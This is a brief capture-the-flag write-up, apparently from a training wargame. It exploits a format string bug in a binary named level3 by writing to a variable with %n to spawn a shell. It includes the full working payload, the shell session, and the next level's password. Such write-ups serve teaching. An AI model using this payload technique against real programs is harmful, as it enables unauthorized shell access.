If we decompile our executable with `objdump -d level3` where we found a `printf` and a `system('/bin/sh').
With some researchs, we discover 'Format String Exploit', the aim is to use printf to evaluate code instead of printing it :
```bash
./level3 
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```

Our goal here is to send the adress of `m` in `%x` using `printf` : 
```bash
(python -c "print '\x8c\x98\x04\x08%x%x%x' + 'A' * 41 + '%n'"; cat) | ./level3
?200b7fd1ac0b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cd .. && cat level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
Address of <m> + PADDING + %n for extract length into <m>


                    